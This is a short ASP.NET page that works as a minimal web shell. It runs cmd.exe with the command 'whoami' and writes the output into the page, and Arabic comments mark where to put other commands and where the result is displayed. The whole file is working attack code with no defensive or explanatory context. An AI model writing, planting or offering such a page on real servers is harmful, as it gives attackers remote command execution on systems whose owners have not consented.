<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<!DOCTYPE html>
<html>
<head>
    <title>Command Execution</title>
</head>
<body>
    <h1>Command Output</h1>
    <pre>
    <%
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c whoami"; // ضع الأمر هنا
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            Response.Write(output); // عرض النتيجة
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    %>
    </pre>
</body>
</html>
